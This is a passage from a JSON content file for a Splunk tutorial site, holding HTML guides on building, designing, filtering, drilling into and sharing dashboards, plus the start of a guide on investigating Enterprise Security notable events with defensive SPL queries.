reference data) or <code>append + stats</code> (for combining search results).</p>\n                </div>\n            "
      }
    ],
    "dashboards": [
      {
        "id": "dash-fundamentals",
        "title": "Dashboard fundamentals for analysts",
        "description": "Understand what dashboards are, when to use them, and how they fit into your analysis workflow.",
        "keywords": "dashboard basics fundamentals overview introduction why use panels",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">What is a Dashboard?</div>\n                    <div class=\"guide-detail-section\">\n                        <p>A dashboard is a collection of panels - each panel runs a search and displays results as a visualization, table, or single value. Dashboards let you monitor multiple things at once without re-running searches manually.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Why Use Dashboards?</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Save time</strong> - Stop re-typing the same searches every day</li>\n                            <li><strong>Monitor at a glance</strong> - See the health of systems, security posture, or KPIs instantly</li>\n                            <li><strong>Share knowledge</strong> - Give your team pre-built views instead of teaching everyone SPL</li>\n                            <li><strong>Consistency</strong> - Everyone sees the same data, calculated the same way</li>\n                            <li><strong>Investigation launchpads</strong> - Start from a dashboard, then drill down into details</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Dashboard Components</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Panels</div>\n                        <p>Each panel contains one search and one visualization. A dashboard typically has 4-12 panels arranged in rows.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Inputs</div>\n                        <p>Dropdowns, text boxes, and time pickers that let users filter the dashboard without editing searches. Example: a dropdown to select which server to view.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Drilldowns</div>\n                        <p>Click actions that take you somewhere else - another dashboard, a detailed search, or an external URL. Essential for investigation workflows.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">When to Build a Dashboard</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li>You run the same searches daily or weekly</li>\n                            <li>Multiple people need to see the same data</li>\n                            <li>You want to monitor something continuously</li>\n                            <li>You need a starting point for investigations</li>\n                            <li>Leadership wants visibility without learning SPL</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Analyst Tip</div>\n                    <p>Don't dashboard everything. Keep ad-hoc investigation searches ad-hoc. Dashboard the things you check repeatedly - daily health checks, weekly reports, ongoing monitoring. Your dashboards should answer questions you ask over and over.</p>\n                </div>\n            "
      },
      {
        "id": "dash-first-dashboard",
        "title": "How to build your first dashboard",
        "description": "Step-by-step guide to creating a dashboard from scratch using the Splunk UI.",
        "keywords": "create build new dashboard first beginner tutorial step by step",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Create a simple dashboard with 2-3 panels that you can use and customize. We'll use the Dashboard Studio (the modern editor) which is the default in newer Splunk versions.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 1: Create the Dashboard</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li>From the Splunk home page, click <strong>Dashboards</strong> in the left menu</li>\n                            <li>Click <strong>Create New Dashboard</strong></li>\n                            <li>Give it a name (e.g., \"Security Overview\")</li>\n                            <li>Select <strong>Dashboard Studio</strong> (recommended) or Classic Dashboards</li>\n                            <li>Click <strong>Create</strong></li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 2: Add Your First Panel</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li>Click <strong>Add Panel</strong> or the <strong>+</strong> icon</li>\n                            <li>Select a visualization type (start with <strong>Table</strong> or <strong>Single Value</strong>)</li>\n                            <li>In the search editor, enter your SPL:</li>\n                        </ol>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625\n| stats count as \"Failed Logins\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">A simple single value showing total failed logins.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <ol start=\"4\">\n                            <li>Set your time range (e.g., \"Last 24 hours\")</li>\n                            <li>Click <strong>Apply</strong> to see results</li>\n                            <li>Give the panel a title like \"Failed Logins (24h)\"</li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 3: Add More Panels</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Repeat the process. Good starter panels:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625\n| timechart span=1h count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Line chart showing failed logins over time.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625\n| stats count by src_ip\n| sort - count\n| head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Table of top 10 source IPs with failed logins.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 4: Arrange and Save</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li>Drag panels to rearrange them</li>\n                            <li>Resize panels by dragging corners</li>\n                            <li>Click <strong>Save</strong> in the top right</li>\n                        </ol>\n                        <p>Your dashboard is now saved and accessible from the Dashboards menu.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Start with searches you've already tested in the Search app. Get the search working first, then add it to a dashboard. Don't try to write new SPL directly in the dashboard editor.</p>\n                </div>\n            "
      },
      {
        "id": "dash-best-practices",
        "title": "Dashboard design best practices",
        "description": "Design principles for creating effective, performant dashboards that people actually use.",
        "keywords": "best practices design layout performance tips efficient effective",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Layout Principles</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Most important = top left</div>\n                        <p>People read dashboards like a page - top to bottom, left to right. Put your key metrics and alerts at the top.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Group related panels</div>\n                        <p>Keep authentication panels together, network panels together, etc. Use visual rows to create sections.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Limit to 8-12 panels</div>\n                        <p>More panels = slower load times and visual overload. If you need more, create multiple focused dashboards.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Performance Tips</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Use specific indexes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security sourcetype=WinEventLog:Security</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Always specify index and sourcetype. Never use <code>index=*</code> on dashboards.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Use tstats for high-volume data</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| tstats count WHERE index=web by _time span=1h</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">tstats searches indexed fields only - much faster than regular searches for simple counts.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Limit time ranges</div>\n                        <p>Default to 24 hours or 7 days, not \"All Time\". Let users expand if needed via time picker input.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Use base searches</div>\n                        <p>If multiple panels use similar data, create one base search and have panels reference it. This runs one search instead of many.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Visualization Choice</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Single Value</strong> - Key metrics, counts, current status</li>\n                            <li><strong>Line/Area Chart</strong> - Trends over time</li>\n                            <li><strong>Bar Chart</strong> - Comparing categories (top users, top sources)</li>\n                            <li><strong>Pie Chart</strong> - Proportions (use sparingly, max 5-6 slices)</li>\n                            <li><strong>Table</strong> - Detailed data, lists, when you need exact values</li>\n                            <li><strong>Map</strong> - Geographic data only</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Usability</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Descriptive titles</strong> - \"Failed Logins by User (7d)\" not \"Panel 1\"</li>\n                            <li><strong>Consistent time ranges</strong> - All panels should use the same time range or make it obvious when they don't</li>\n                            <li><strong>Add drilldowns</strong> - Let users click to investigate further</li>\n                            <li><strong>Include context</strong> - What's normal? Add thresholds or comparisons</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Common Mistakes</div>\n                    <p>Avoid real-time searches unless truly needed (they're expensive). Don't use <code>| table *</code> (pulls all fields). Don't create \"everything\" dashboards - make focused ones for specific purposes.</p>\n                </div>\n            "
      },
      {
        "id": "dash-inputs-filters",
        "title": "How to add inputs and filters",
        "description": "Make dashboards interactive with dropdowns, time pickers, and text inputs that filter your data.",
        "keywords": "input filter dropdown time picker text box token interactive dynamic",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Add interactive controls that let users filter dashboard data without editing searches. For example, a dropdown to select a specific host or user.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">How Inputs Work</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Inputs create <strong>tokens</strong> - variables that get inserted into your searches. When a user selects \"server01\" from a dropdown, the token <code>$host$</code> becomes \"server01\" and all searches using that token re-run.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Adding a Dropdown Input</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li>In Dashboard Studio, click <strong>Add Input</strong></li>\n                            <li>Select <strong>Dropdown</strong></li>\n                            <li>Configure the input:\n                                <ul>\n                                    <li><strong>Token:</strong> <code>selected_host</code></li>\n                                    <li><strong>Label:</strong> \"Select Host\"</li>\n                                    <li><strong>Default:</strong> <code>*</code> (shows all)</li>\n                                </ul>\n                            </li>\n                            <li>For dynamic choices, add a search:</li>\n                        </ol>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main | stats count by host | fields host</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Populates dropdown with actual hosts from your data.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using Tokens in Searches</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Reference the token in your panel searches with <code>$token_name$</code>:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main host=$selected_host$\n| stats count by sourcetype</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">When user selects \"server01\", this becomes <code>host=server01</code>. When they select the default \"*\", it shows all hosts.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Common Input Types</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Time Range Picker</div>\n                        <p>Lets users control the dashboard time range. Uses <code>$time.earliest$</code> and <code>$time.latest$</code> tokens.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Text Input</div>\n                        <p>Free-form text entry. Good for searching specific usernames, IPs, or error messages.</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=*$search_user$*</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Wildcards around the token allow partial matches.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Multiselect Dropdown</div>\n                        <p>Select multiple values. The token contains all selections in a search-friendly format.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Input Best Practices</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li>Always set a sensible default value</li>\n                            <li>Add an \"All\" option with value <code>*</code></li>\n                            <li>Keep dropdown lists reasonable (under 100 items)</li>\n                            <li>Put inputs at the top of the dashboard</li>\n                            <li>Group related inputs together</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Test your dashboard with different input combinations. Make sure it handles edge cases like empty selections or special characters in values. A dropdown that breaks the search when you select \"O'Brien\" is not a good dropdown.</p>\n                </div>\n            "
      },
      {
        "id": "dash-drilldowns",
        "title": "How to set up drilldowns for investigations",
        "description": "Configure click actions that take users from summary views to detailed investigations.",
        "keywords": "drilldown click action investigate detail link navigation workflow",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Make your dashboards interactive investigation tools. When an analyst sees something suspicious, they should be able to click and dig deeper immediately.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">What is a Drilldown?</div>\n                    <div class=\"guide-detail-section\">\n                        <p>A drilldown is an action triggered when someone clicks on a chart, table row, or value. It can:</p>\n                        <ul>\n                            <li>Open a new search with the clicked value</li>\n                            <li>Navigate to another dashboard with context</li>\n                            <li>Link to an external system (ticketing, wiki, etc.)</li>\n                            <li>Set tokens to filter the current dashboard</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Setting Up Basic Drilldowns</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">In Dashboard Studio</div>\n                        <ol>\n                            <li>Select a panel</li>\n                            <li>Click the <strong>Interactions</strong> tab (or drilldown settings)</li>\n                            <li>Enable drilldown</li>\n                            <li>Choose the action type</li>\n                        </ol>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Drilldown to Search</div>\n                        <p>Open the Search app with a pre-built query. Use tokens to pass the clicked value:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security src_ip=$click.value$\n| table _time, user, action, dest</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\"><code>$click.value$</code> contains whatever the user clicked on.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Useful Drilldown Tokens</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>$click.value$</code> - The value that was clicked</li>\n                            <li><code>$click.name$</code> - The field name of the clicked value</li>\n                            <li><code>$row.&lt;fieldname&gt;$</code> - Value of a specific field in the clicked row</li>\n                            <li><code>$earliest$</code> / <code>$latest$</code> - Time range of the panel</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Drilldown to Another Dashboard</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Pass context to a detailed dashboard using URL parameters:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>/app/search/user_investigation?form.username=$row.user$</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Opens the \"user_investigation\" dashboard with the username pre-filled.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Investigation Workflow Example</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Build a three-level investigation flow:</p>\n                        <ol>\n                            <li><strong>Overview Dashboard</strong> - High-level metrics and alerts</li>\n                            <li><strong>Entity Dashboard</strong> - Details about a specific user, host, or IP (reached via drilldown)</li>\n                            <li><strong>Raw Search</strong> - Full event details (final drilldown)</li>\n                        </ol>\n                        <p>Each level provides more detail. Analysts start broad and click to focus.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Analyst Tip</div>\n                    <p>Design drilldowns around investigation questions. When an analyst sees a spike in failed logins, what's their next question? Probably \"which users?\" or \"which sources?\" - make those one click away.</p>\n                </div>\n            "
      },
      {
        "id": "dash-analyst-workflows",
        "title": "Using dashboards in analyst workflows",
        "description": "Practical strategies for integrating dashboards into daily monitoring, triage, and investigation routines.",
        "keywords": "workflow monitoring triage investigation routine daily soc analyst hunting",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Big Picture</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Dashboards aren't just pretty pictures - they're operational tools. Used well, they make you faster and help you catch things you'd otherwise miss.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Daily Monitoring Workflow</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Morning Check Dashboard</div>\n                        <p>Create a \"start of shift\" dashboard that answers: What happened overnight? What needs attention?</p>\n                        <ul>\n                            <li>Alert counts by severity (last 12-24 hours)</li>\n                            <li>Failed authentication trends</li>\n                            <li>System health indicators</li>\n                            <li>Anomalies or threshold breaches</li>\n                        </ul>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Make it actionable</div>\n                        <p>Every panel should either show \"all clear\" or lead somewhere. If failed logins are high, one click should show you which accounts. Don't make analysts context-switch to investigate.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Triage Workflow</div>\n                    <div class=\"guide-detail-section\">\n                        <p>When alerts fire, you need to quickly determine: Is this real? How bad? What's affected?</p>\n                        <div class=\"guide-detail-label\">Alert Triage Dashboard Pattern</div>\n                        <ul>\n                            <li><strong>Top row:</strong> Key context about the alerted entity (user/host/IP)</li>\n                            <li><strong>Middle:</strong> Related activity timeline</li>\n                            <li><strong>Bottom:</strong> Historical baseline - is this normal for this entity?</li>\n                        </ul>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <p>Use inputs to quickly pivot between entities. Drilldowns to raw events for evidence.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Investigation Dashboard</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Deep-dive dashboards for confirmed incidents. Build these around entities:</p>\n                        <div class=\"guide-detail-label\">User Investigation Dashboard</div>\n                        <ul>\n                            <li>Authentication history (successes and failures)</li>\n                            <li>Systems accessed</li>\n                            <li>Data accessed or transferred</li>\n                            <li>Timeline of all activity</li>\n                            <li>Comparison to peer group behavior</li>\n                        </ul>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Host Investigation Dashboard</div>\n                        <ul>\n                            <li>Process execution history</li>\n                            <li>Network connections</li>\n                            <li>File modifications</li>\n                            <li>User logins</li>\n                            <li>Installed software changes</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Threat Hunting with Dashboards</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Hunting dashboards focus on patterns and anomalies:</p>\n                        <ul>\n                            <li>Rare process executions</li>\n                            <li>First-time connections</li>\n                            <li>Outliers in behavior (statistical or rule-based)</li>\n                            <li>Known-bad indicators</li>\n                        </ul>\n                        <p>These dashboards surface candidates for investigation. Not every hit is malicious - that's where analyst judgment comes in.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Workflow Tip</div>\n                    <p>Create a personal \"Analyst Home\" dashboard with links to all your operational dashboards. Organize by workflow: Monitoring, Triage, Investigation, Hunting. One bookmark, everything accessible.</p>\n                </div>\n            "
      },
      {
        "id": "dash-realtime-monitoring",
        "title": "Building real-time monitoring dashboards",
        "description": "When and how to use real-time searches for live monitoring, and how to avoid performance pitfalls.",
        "keywords": "real-time realtime live monitoring streaming performance refresh",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">When to Use Real-Time</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Real-time searches continuously process events as they arrive. Use them when:</p>\n                        <ul>\n                            <li>You need to see events within seconds of occurrence</li>\n                            <li>You're monitoring active incidents</li>\n                            <li>You're watching a deployment or change window</li>\n                            <li>Display screens for NOC/SOC visibility</li>\n                        </ul>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <p><strong>Don't use real-time</strong> for general dashboards. Scheduled searches with auto-refresh are usually better - same visibility, fraction of the cost.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-Time Search Types</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Windowed Real-Time</div>\n                        <p>Shows a sliding time window (e.g., last 5 minutes). Less resource-intensive.</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625 earliest=-5m\n| stats count by src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Set time picker to \"5 minute window\" in real-time options.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">All-Time Real-Time</div>\n                        <p>Accumulates all events since the search started. Use sparingly - memory intensive.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Performance Considerations</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Limit concurrent real-time searches</strong> - Each one consumes resources continuously</li>\n                            <li><strong>Use specific filters</strong> - The more data flowing through, the higher the cost</li>\n                            <li><strong>Prefer windowed over all-time</strong> - Bounded memory usage</li>\n                            <li><strong>Avoid transforming commands when possible</strong> - Stats, timechart, etc. add overhead</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Alternative: Scheduled + Auto-Refresh</div>\n                    <div class=\"guide-detail-section\">\n                        <p>For most monitoring needs, this pattern works better:</p>\n                        <ol>\n                            <li>Create a scheduled search that runs every 1-5 minutes</li>\n                            <li>Save results to a summary index or lookup</li>\n                            <li>Dashboard reads from the summary (fast)</li>\n                            <li>Set dashboard to auto-refresh every minute</li>\n                        </ol>\n                        <p>Result: Near-real-time visibility with much lower resource usage.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-Time Dashboard Pattern</div>\n                    <div class=\"guide-detail-section\">\n                        <p>A typical real-time ops dashboard:</p>\n                        <ul>\n                            <li><strong>Row 1:</strong> Single values showing current counts/rates</li>\n                            <li><strong>Row 2:</strong> Live event stream (last 100 events)</li>\n                            <li><strong>Row 3:</strong> 5-minute trending chart</li>\n                        </ul>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| head 100\n| table _time, src_ip, dest_ip, dest_port, rule</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Live stream of blocked connections - useful during active monitoring.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Resource Warning</div>\n                    <p>Real-time searches run until you close them. A dashboard with 6 real-time panels left open overnight is running 6 continuous searches. Always close real-time dashboards when you're done, or set them to convert to historical after a timeout.</p>\n                </div>\n            "
      },
      {
        "id": "dash-sharing-permissions",
        "title": "How to share dashboards and manage permissions",
        "description": "Control who can view, edit, and manage your dashboards across the organization.",
        "keywords": "share sharing permissions access control roles private app global",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Permission Levels</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Private (User)</div>\n                        <p>Only you can see and edit. Good for personal dashboards and work-in-progress.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">App-Level (App)</div>\n                        <p>Anyone with access to the app can see it. Most common for team dashboards.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Global (All Apps)</div>\n                        <p>Visible across all apps. Use for organization-wide dashboards.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Changing Permissions</div>\n                    <div class=\"guide-detail-section\">\n                        <ol>\n                            <li>Go to <strong>Settings > User Interface > Views</strong></li>\n                            <li>Find your dashboard</li>\n                            <li>Click <strong>Permissions</strong></li>\n                            <li>Set the sharing level and role-based access</li>\n                        </ol>\n                        <p>Or from the dashboard: <strong>Edit > Edit Permissions</strong></p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Role-Based Access</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Within each sharing level, you can set per-role permissions:</p>\n                        <ul>\n                            <li><strong>Read</strong> - Can view the dashboard</li>\n                            <li><strong>Write</strong> - Can edit the dashboard</li>\n                        </ul>\n                        <p>Example: Share with App, give all users Read, give analysts Write.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Sharing Best Practices</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Start private</strong> - Build and test before sharing</li>\n                            <li><strong>Use descriptive names</strong> - \"Q4 Security Metrics\" not \"Dashboard 2\"</li>\n                            <li><strong>Document your dashboards</strong> - Add a description explaining what it shows and who it's for</li>\n                            <li><strong>Limit write access</strong> - Too many editors leads to inconsistency</li>\n                            <li><strong>Consider creating an app</strong> - For major dashboard collections, a dedicated app keeps things organized</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Exporting Dashboards</div>\n                    <div class=\"guide-detail-section\">\n                        <p>To share dashboards between Splunk instances:</p>\n                        <ol>\n                            <li>Go to the dashboard</li>\n                            <li>Click <strong>Edit > Export</strong></li>\n                            <li>Download as XML or JSON</li>\n                            <li>Import on the target system via UI or copying to <code>$SPLUNK_HOME/etc/apps/[app]/local/data/ui/views/</code></li>\n                        </ol>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Create a \"Dashboard Directory\" dashboard - a simple page with links and descriptions of all your team's dashboards. Makes it easy for new team members to find what they need.</p>\n                </div>\n            "
      }
    ],
    "enterpriseSecurity": [
      {
        "id": "es-investigate-notable",
        "title": "How to investigate a notable event",
        "description": "Step-by-step workflow for triaging and investigating ES notable events.",
        "keywords": "notable event investigate triage incident review ES enterprise security alert",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You have a notable event in Incident Review that needs investigation. You want to determine if it's a true positive (real threat), false positive (benign), or needs escalation.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 1: Understand the Alert</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable event_id=\"YOUR_EVENT_ID\" | table _time, rule_name, rule_description, urgency, src, dest, user, drilldown_search</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Start by reading the rule description and understanding what triggered the alert. The drilldown_search field contains SPL to find the original events.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 2: Add Business Context</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>`notable` | search event_id=\"YOUR_EVENT_ID\"\n| `get_asset(dest)`\n| `get_identity4events(user)`\n| table dest, dest_priority, dest_owner, dest_category, user, user_category, user_bunit</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Enrich with asset and identity data. Is this a critical server? A privileged user? An executive? Context determines urgency.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 3: Check for Related Activity</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Related notables for same entities</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=notable (user=\"jsmith\" OR src=\"192.168.1.100\" OR dest=\"server01\")\n| stats count, earliest(_time) as first, latest(_time) as last by rule_name\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Are there other alerts involving the same user/host? Multiple different detections = higher confidence.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 4: Review Risk Profile</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=risk (risk_object=\"jsmith\" OR risk_object=\"192.168.1.100\")\n| stats sum(risk_score) as total_risk, dc(source) as unique_rules, values(source) as detections\n| table total_risk, unique_rules, detections</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Check accumulated risk. High risk from multiple rules indicates sustained suspicious activity.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 5: Drill Down to Raw Events</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Use the <code>drilldown_search</code> field from the notable, or build your own query to the source data:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=wineventlog user=\"jsmith\" earliest=-24h\n| table _time, EventCode, ComputerName, src_ip, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Look at the actual events that triggered the detection. Verify the behavior is what the alert claims.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div 